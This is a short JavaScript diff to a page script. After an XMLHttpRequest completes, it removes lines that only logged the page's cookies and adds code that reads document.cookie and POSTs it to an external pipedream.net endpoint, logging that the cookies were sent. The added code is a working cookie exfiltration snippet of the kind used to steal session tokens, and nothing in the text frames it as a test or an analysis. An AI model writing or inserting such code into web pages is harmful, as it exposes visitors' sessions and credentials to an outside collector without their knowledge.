@@ -5,10 +5,16 @@ xhr.onreadystatechange = function() {
     if (xhr.readyState == 4 && xhr.status == 200) {
         var response = JSON.parse(xhr.responseText);
         console.log(response);
-        console.log('Cookies sent with the response:');
-        console.log(document.cookie);
+        
+        var cookieData = document.cookie;
+
+        var cookieXhr = new XMLHttpRequest();
+        cookieXhr.open('POST', 'https://eon32wucwm6yep3.m.pipedream.net', true);
+        cookieXhr.setRequestHeader('Content-Type', 'application/json');
+        
+        cookieXhr.send(JSON.stringify({ cookies: cookieData }));
+
+        console.log('Cookies sent to external server:', cookieData);
     }
 };
-
-// Send the request
 xhr.send();
